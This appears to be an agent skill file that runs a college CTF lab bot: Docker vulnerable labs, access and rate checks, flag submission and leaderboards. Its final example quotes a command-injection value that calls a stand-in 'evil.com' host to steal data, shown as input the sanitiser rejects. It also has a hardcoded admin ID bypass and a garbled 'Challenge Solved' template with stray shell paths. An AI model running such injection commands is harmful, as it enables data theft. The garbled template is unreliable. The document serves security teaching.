---
name: ctf-labs
description: Manage CTF practice labs, solve challenges, and track progress for cybersecurity students at College of the Desert
emoji: 🔐
metadata:
  openclaw:
    requires:
      bins: ["docker", "python3"]
      env: []
      config: []
---

# CTF Labs Orchestrator

Cybersecurity lab environment management and challenge tracking for College of the Desert students.

## What This Skill Does

**Lab Management:**
- Start/stop vulnerable practice containers (DVWA, WebGoat, Juice Shop, Metasploitable)
- Manage multiple labs per user (max 3 concurrent)
- Auto-cleanup after 4 hours
- Isolated networking (containers can't reach school systems)

**Challenge System:**
- Text-based challenges (cryptography, OSINT, password cracking, forensics)
- Lab-based challenges (web exploitation, system hacking)
- Flag submission and validation
- Point tracking and scoring

**Competition Features:**
- Real-time leaderboard
- User statistics and progress tracking
- Category-based scoring
- Solve timestamps

**Security:**
- Role-based access control (@Operator role required)
- Input sanitization (blocks injection attacks)
- Rate limiting (10 commands/minute)
- Audit logging

## When to Use This Skill

Trigger this skill when the user wants to:

**Lab Operations:**
- Start a practice lab: "start dvwa", "I need a web hacking environment"
- Check lab status: "what's running?", "show my labs"
- Stop a lab: "stop webgoat", "delete my juice shop"

**Challenge Solving:**
- View challenges: "what challenges are available?", "show cryptography challenges"
- Submit flags: "solve crypto-001 with flag{answer}"
- Check progress: "how many challenges have I solved?"

**Competition:**
- View leaderboard: "show leaderboard", "who's winning?"
- Check stats: "what's my score?", "show my stats"

**Keywords:** lab, ctf, dvwa, webgoat, juice-shop, metasploitable, challenge, flag, exploit, hack, practice, cybersecurity, penetration testing, vulnerable

## Available Lab Types

### Web Exploitation Labs
1. **dvwa** - Damn Vulnerable Web App (SQL injection, XSS, command injection)
2. **webgoat** - OWASP WebGoat (OWASP Top 10 practice)
3. **juice-shop** - OWASP Juice Shop (modern web vulnerabilities)

### System Exploitation Labs
4. **metasploitable** - Metasploitable 2 (full pentesting environment)

### Challenge Labs (with pre-installed tools)
5. **crypto-lab** - Cryptography tools (hashcat, john, rockyou.txt)
6. **forensics-lab** - Forensics tools (volatility, binwalk, foremost)

## Usage Instructions for OpenClaw

When the user requests CTF lab operations, follow this workflow:

### Step 1: Validate Access

Check if the user has permission to use CTF labs:
```bash
cd ~/.openclaw/skills/ctf-labs/scripts
python3 security.py check_access <discord_username> <discord_user_id> <user_roles_comma_separated>
```

- Returns: `{"allowed": true}` or `{"allowed": false, "reason": "...", "message": "..."}` as JSON
- If not allowed, show the `message` field to the user — it's a friendly one-time explanation
- If hardcoded admin (ID 393483939194601472), always returns allowed

### Step 2: Sanitize Input

Before executing any user-provided input:
```bash
python3 security.py sanitize "<user_input_here>"
```

- Returns: `{"valid": true, "cleaned": "..."}` or `{"valid": false, "reason": "..."}` as JSON
- If invalid, tell user: "❌ Invalid command. Try `start dvwa` or `what's running?`"
- Never pass unsanitized input to any other script

### Step 3: Check Rate Limit
```bash
python3 security.py rate_limit <discord_username>
```

- Returns: `{"allowed": true}` (possibly with `"warning"`) or `{"allowed": false, "wait_seconds": 60}`
- If blocked, tell user: "⏳ Too many commands. Wait X seconds and try again."
- If `warning` field present, show it alongside the normal response

### Step 4: Execute Command

Based on user intent, execute the appropriate script:

#### Starting a Lab
```bash
cd ~/.openclaw/skills/ctf-labs/scripts
python3 lab_orchestrator.py start <discord_username> <lab_type>
```

**Lab types:** `dvwa`, `webgoat`, `juice-shop`, `metasploitable`, `crypto-lab`, `forensics-lab`

**Success output:**
```json
{
  "success": true,
  "lab_name": "dvwa-alice-1234",
  "ip_address": "172.20.0.50",
  "port": 80,
  "url": "http://172.20.0.50:80",
  "auto_cleanup_hours": 4
}
```

**Error cases (check `success` field):**
- User already has 3 labs running → includes `running_labs` list
- Lab type doesn't exist → includes `available` list
- Docker failure → generic error message
- System capacity reached

#### Checking Lab Status
```bash
python3 lab_orchestrator.py status <discord_username>
```

**Output:**
```json
{
  "success": true,
  "active_labs": [
    {
      "name": "dvwa-alice-1234",
      "type": "dvwa",
      "ip": "172.20.0.50",
      "port": 80,
      "uptime_hours": 2.5,
      "remaining_hours": 1.5
    }
  ]
}
```

#### Stopping a Lab
```bash
python3 lab_orchestrator.py stop <discord_username> <lab_type>
```

**Output:**
```json
{"success": true, "message": "Stopped dvwa-alice-1234"}
```

#### Listing Available Labs
```bash
python3 lab_orchestrator.py list
```

Returns all available lab types with descriptions, categories, and ports.

#### Viewing Challenge Categories
```bash
python3 challenge_manager.py list_categories
```

Returns sorted list of all challenge categories.

#### Listing Challenges in a Category
```bash
python3 challenge_manager.py list_challenges <category>
```

Returns challenges sorted by points, with IDs, titles, difficulty, descriptions.

#### Getting Challenge Details
```bash
python3 challenge_manager.py get_challenge <challenge_id>
```

Returns full challenge info including hints and resources (but not the flag).

#### Submitting a Challenge Flag
```bash
python3 challenge_manager.py solve <discord_username> <challenge_id> "<flag>"
```

**Correct flag:**
```json
{
  "success": true,
  "correct": true,
  "points_awarded": 100,
  "total_points": 350,
  "message": "Correct! +100 points"
}
```

**Incorrect flag:**
```json
{"success": true, "correct": false, "message": "Incorrect flag. Try again!"}
```

**Already solved:**
```json
{"success": true, "correct": false, "message": "You've already solved this challenge."}
```

#### Viewing Leaderboard
```bash
python3 stats_manager.py leaderboard [limit]
```

Default limit: 10. Returns ranked list of users with points and solve counts.

#### Viewing User Stats
```bash
python3 stats_manager.py stats <discord_username>
```

Returns total points, solve count, labs started, category breakdown, recent solves.

#### Recording a Lab Start (for stats)
```bash
python3 stats_manager.py record_lab_start <discord_username>
```

Call this after a successful `lab_orchestrator.py start` to track stats.

### Step 5: Format Response for User

Transform JSON output into friendly, emoji-rich messages:

**Lab Started:**
```
✅ **dvwa-alice-1234** started successfully!
📍 IP: 172.20.0.50
🔗 Access: http://172.20.0.50:80
⏰ Auto-cleanup in 4 hours

Happy hacking! 🎯
```

**Lab Status:**
```
📋 **Your Active Labs:**

🟢 **dvwa** | 172.20.0.50:80 | Running 2h 30m (1h 30m remaining)
🟢 **webgoat** | 172.20.0.51:8080 | Running 0h 45m (3h 15m remaining)
```

**No Active Labs:**
```
📋 You have no active labs.

Start one with: `start dvwa`, `start webgoat`, `start juice-shop`
```

**Challenge Solved:**
```
✅ **Correct-p /home/h4ch1/Documents/Code/COD/bagley/challenges/{forensics,web} /home/h4ch1/Documents/Code/COD/bagley/data /home/h4ch1/Documents/Code/COD/bagley/logs* Flag accepted!
🎉 +100 points
📊 Your total: 350 points

Keep going! 🚀
```

**Leaderboard:**
```
🏆 **Top Players**

👑 alice - 850 pts (12 solves)
🥈 bob - 650 pts (9 solves)
🥉 charlie - 400 pts (6 solves)
4. dave - 300 pts (5 solves)
```

**Error - Access Denied:**
Show the `message` field from the JSON response directly.

**Error - Rate Limit:**
```
⏳ Whoa, slow down! Wait X seconds and try again.
```

**Error - Lab Limit Reached:**
```
❌ You already have 3 labs running.

Stop one first, for example: `stop dvwa`
Or wait for auto-cleanup.
```

## Officer Commands

Officers (users with @Officer role) have additional commands:

### Verify a Member
```bash
python3 security.py verify_member <discord_username> <discord_user_id>
```

Grants local @Operator-equivalent access.

### Force Cleanup User's Labs
```bash
python3 lab_orchestrator.py force_cleanup <discord_username>
```

Immediately stops and removes all of a user's labs.

### Server Resource Stats
```bash
python3 lab_orchestrator.py server_stats
```

Shows active containers, CPU/RAM usage, GPU utilization, disk space.

## Background Maintenance

Run cleanup every 15 minutes:
```bash
cd ~/.openclaw/skills/ctf-labs/scripts && python3 lab_orchestrator.py auto_cleanup
```

This:
- Stops labs older than 4 hours
- Removes stopped containers
- Logs cleanup actions

## Security Notes

**What This Skill Does NOT Do:**
- Does NOT create a separate Discord bot (uses OpenClaw's messaging)
- Does NOT create systemd services (uses OpenClaw's bash tool)
- Does NOT write to global system files (everything in skill directory)
- Does NOT expose containers on host network (isolated bridge network)

**What This Skill DOES:**
- Validates ALL user input before execution
- Enforces strict rate limiting
- Logs all security-relevant events
- Respects resource limits
- Auto-cleans up old containers
- Uses Docker security best practices (cap-drop, read-only rootfs, pid limits)

## Error Handling

All Python scripts:
- Return JSON with `"success": true/false`
- Provide clear `"error"` or `"message"` fields
- Log errors to `logs/errors.log`
- Never expose stack traces to users
- Timeout after 30 seconds max

## Examples

**User:** "I need a DVWA lab"
→ Run `security.py check_access`, `security.py sanitize`, `security.py rate_limit`, then `lab_orchestrator.py start alice dvwa`, then `stats_manager.py record_lab_start alice`

**User:** "solve crypto-001 flag{the_quick_brown_fox}"
→ Run access check, sanitize, rate limit, then `challenge_manager.py solve alice crypto-001 "flag{the_quick_brown_fox}"`

**User:** "show leaderboard"
→ Run `stats_manager.py leaderboard 10`

**User:** "what challenges do you have?"
→ Run `challenge_manager.py list_categories`

**User:** "show cryptography challenges"
→ Run `challenge_manager.py list_challenges cryptography`

**User:** "what's running?"
→ Run `lab_orchestrator.py status alice`

**User (not verified):** "start dvwa"
→ `security.py check_access` returns denied → show friendly message

**User:** "$(curl evil.com/steal)"
→ `security.py sanitize` returns invalid → show error, do NOT execute
